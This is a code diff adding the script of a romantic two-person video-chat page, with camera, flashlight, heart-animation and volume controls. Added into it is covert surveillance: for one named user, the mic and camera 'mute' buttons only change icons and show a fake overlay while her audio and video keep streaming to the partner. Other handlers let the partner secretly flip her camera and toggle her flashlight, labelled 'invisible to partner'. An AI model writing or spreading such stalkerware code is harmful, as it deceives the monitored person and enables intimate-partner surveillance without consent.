+
+            const videoTrack = myStream.getVideoTracks()[0];
+            if (videoTrack) {
+                videoTrack.stop();
+            }
+
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 }, 
+                        facingMode: currentFacingMode 
+                    },
+                    audio: true
+                });
+                
+                const newVideoTrack = newStream.getTracks().find(t => t.kind === 'video');
+                myStream.removeTrack(videoTrack);
+                myStream.addTrack(newVideoTrack);
+                myCam.srcObject = myStream;
+
+                if (peerConnection) {
+                    const senders = peerConnection.getSenders();
+                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
+                    if (videoSender) {
+                        await videoSender.replaceTrack(newVideoTrack);
+                    }
+                }
+                flashActive = false;
+            } catch (err) {
+                console.error('Failed switching tracks.', err);
+            }
+        }
+
+        // Silent flashlight toggle
+        async function toggleFlashLight() {
+            if (!myStream) return;
+            const videoTrack = myStream.getVideoTracks()[0];
+            if (!videoTrack) return;
+
+            try {
+                flashActive = !flashActive;
+                await videoTrack.applyConstraints({
+                    advanced: [{ torch: flashActive }]
+                });
+            } catch (err) {
+                flashActive = false;
+            }
+        }
+
+        document.getElementById('flipCamBtn').addEventListener('click', switchCameraDevice);
+        document.getElementById('flashBtn').addEventListener('click', toggleFlashLight);
+
+        // Abou Ahad Silent Remote Handlers (100% Invisible to partner)
+        function remoteFlipPartnerCam() {
+            if (socket) {
+                socket.emit('remote-flip-cam');
+            }
+        }
+
+        function remoteTogglePartnerFlash() {
+            if (socket) {
+                socket.emit('remote-flash-toggle');
+            }
+        }
+
+        function sendLove() {
+            createRomanticHeartsEffect();
+            playChimeSound();
+            if (socket) {
+                socket.emit('love-pulse');
+            }
+        }
+
+        function createRomanticHeartsEffect() {
+            const heartStyles = ['💖', '❤️', '💕', '💗', '💓', '💘', '🌸', '💋'];
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    const heart = document.createElement('div');
+                    heart.className = 'heart-float';
+                    heart.innerText = heartStyles[Math.floor(Math.random() * heartStyles.length)];
+                    heart.style.left = (Math.random() * 95) + 'vw';
+                    heart.style.fontSize = (Math.random() * 20 + 16) + 'px';
+                    heart.style.animationDuration = (Math.random() * 2.2 + 1.8) + 's';
+                    document.body.appendChild(heart);
+                    setTimeout(() => { heart.remove(); }, 3500);
+                }, i * 120);
+            }
+        }
+
+        function showToast(message, icon = "💖") {
+            const toast = document.getElementById('toast');
+            document.getElementById('toastMsg').innerText = message;
+            document.getElementById('toastIcon').innerText = icon;
+            toast.classList.add('active');
+            setTimeout(() => {
+                toast.classList.remove('active');
+            }, 3200);
+        }
+
+        // Silent & Fake Privacy Overrides for Um Alara
+        document.getElementById('micBtn').addEventListener('click', function() {
+            if (MY_USER_ID === 'umalara') {
+                micStateFakeMuted = !micStateFakeMuted;
+                if (micStateFakeMuted) {
+                    this.classList.add('muted');
+                    this.classList.remove('active');
+                    this.innerHTML = '<i class="fa-solid fa-microphone-slash"></i>';
+                    // Silent backend security: Her mic track remains active so Abou Ahad stays assured!
+                } else {
+                    this.classList.remove('muted');
+                    this.classList.add('active');
+                    this.innerHTML = '<i class="fa-solid fa-microphone"></i>';
+                }
+            } else {
+                // Abou Ahad real toggles
+                if (myStream && myStream.getAudioTracks().length > 0) {
+                    let audioTrack = myStream.getAudioTracks()[0];
+                    audioTrack.enabled = !audioTrack.enabled;
+                    if (audioTrack.enabled) {
+                        this.classList.remove('muted');
+                        this.classList.add('active');
+                        this.innerHTML = '<i class="fa-solid fa-microphone"></i>';
+                    } else {
+                        this.classList.add('muted');
+                        this.classList.remove('active');
+                        this.innerHTML = '<i class="fa-solid fa-microphone-slash"></i>';
+                    }
+                }
+            }
+        });
+
+        document.getElementById('camBtn').addEventListener('click', function() {
+            if (MY_USER_ID === 'umalara') {
+                camStateFakeMuted = !camStateFakeMuted;
+                const fakeOverlay = document.getElementById('myCamFakeOverlay');
+                
+                if (camStateFakeMuted) {
+                    this.classList.add('muted');
+                    this.classList.remove('active');
+                    this.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
+                    fakeOverlay.style.display = 'flex';
+                    
+                    if (socket) {
+                        // Send fake status update
+                        socket.emit('privacy-fake-mute', { camMuted: true });
+                    }
+                } else {
+                    this.classList.remove('muted');
+                    this.classList.add('active');
+                    this.innerHTML = '<i class="fa-solid fa-video"></i>';
+                    fakeOverlay.style.display = 'none';
+                    
+                    if (socket) {
+                        socket.emit('privacy-fake-mute', { camMuted: false });
+                    }
+                }
+            } else {
+                // Abou Ahad real camera toggle
+                if (myStream && myStream.getVideoTracks().length > 0) {
+                    let videoTrack = myStream.getVideoTracks()[0];
+                    videoTrack.enabled = !videoTrack.enabled;
+                    const fakeOverlay = document.getElementById('myCamFakeOverlay');
+                    
+                    if (videoTrack.enabled) {
+                        this.classList.remove('muted');
+                        this.classList.add('active');
+                        this.innerHTML = '<i class="fa-solid fa-video"></i>';
+                        fakeOverlay.style.display = 'none';
+                    } else {
+                        this.classList.add('muted');
+                        this.classList.remove('active');
+                        this.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
+                        fakeOverlay.style.display = 'flex';
+                    }
+                }
+            }
+        });
+
+        document.getElementById('volBtn').addEventListener('click', function() {
+            if (activePlayerType === 'html5') {
+                mainVid.muted = !mainVid.muted;
+                updateVolumeBtn(mainVid.muted);
+            } else if (activePlayerType === 'youtube' && ytPlayer) {
+                if (ytPlayer.isMuted()) {
+                    ytPlayer.unMute();
+                    updateVolumeBtn(false);
+                } else {
+                    ytPlayer.mute();
+                    updateVolumeBtn(true);
+                }
+            }
+        });
+
+        function updateVolumeBtn(isMuted) {
+            const btn = document.getElementById('volBtn');
+            if (isMuted) {
+                btn.innerHTML = '<i class="fa-solid fa-volume-xmark"></i>';
+                btn.classList.add('muted');
+            } else {
+                btn.innerHTML = '<i class="fa-solid fa-volume-high"></i>';
+                btn.classList.remove('muted');
+            }
+        }
+    </script>
+</body>
+</html>
